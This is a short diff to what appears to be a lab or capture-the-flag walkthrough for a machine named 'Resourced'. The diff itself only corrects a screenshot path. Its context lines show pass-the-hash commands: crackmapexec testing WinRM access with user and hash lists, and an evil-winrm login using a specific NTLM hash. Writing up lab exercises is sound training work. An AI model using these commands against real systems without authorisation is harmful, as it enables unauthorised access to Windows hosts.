@@ -111,7 +111,7 @@ After that, I check if a connection though evilwinrm is possible with crtackmape
 
 crackmapexec winrm 192.168.191.175 -u users.txt -H hashes
 
-![04f74bae0eb4f450e19efe9655fdb97c.png](/assets/img/screenshots/Resourced/046db56c571a4d9dba18aa347f708bde.png)
+![04f74bae0eb4f450e19efe9655fdb97c.png](/assets/img/screenshots/Resourced/04f74bae0eb4f450e19efe9655fdb97c.png)
 
 evil-winrm -i 192.168.191.175 -u 'L.Livingstone' -H '19a3a7550ce8c505c2d46b5e39d6f808'7
 
